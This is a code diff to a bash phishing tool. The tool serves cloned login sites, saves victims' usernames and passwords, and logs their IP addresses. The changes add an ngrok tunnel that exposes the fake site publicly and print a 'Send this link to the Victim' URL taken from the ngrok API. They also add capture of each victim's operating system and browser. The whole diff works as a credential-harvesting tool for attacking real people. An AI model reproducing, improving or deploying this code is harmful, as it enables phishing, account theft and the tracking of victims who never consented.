@@ -189,6 +189,7 @@ checkphp=$(ps aux | grep -o "php" | head -n1)
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
 fi
 
 
@@ -260,7 +261,8 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
-
+sleep 10
+killall -2 ngrok > /dev/null 2>&1
 exit 1
 
 }
@@ -285,9 +287,15 @@ catch_ip() {
 touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+os=$(grep 'OS:' sites/$server/ip.txt | cut -d " " -f2)
+IFS=$'\n'
+bsr=$(grep 'Browser:' sites/$server/ip.txt | cut -d " " -f2)
+IFS=$'\n'
+uaget=$(grep 'User_agent:' sites/$server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim OS:\e[0m\e[1;77m %s\e[0m\n" $os
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim Browser:\e[0m\e[1;77m %s\e[0m\n" $bsr
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;77m %s\e[0m\n" $uaget
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
@@ -376,14 +384,14 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_ip=$(hostname -I)
-printf "\e[1;92m[\e[0m*\e[1;92m] Put your local IP (Default %s): " $default_ip
-read ip
-ip="${ip:-${default_ip}}"
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-sudo php -t "sites/$server" -S "$ip:80" > /dev/null 2>&1 & 
+sudo php -t "sites/$server" -S "127.0.0.1:80" > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
+ngrok http 127.0.0.1:80 > /dev/null 2>&1 &
+sleep 10
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
 checkfound() {
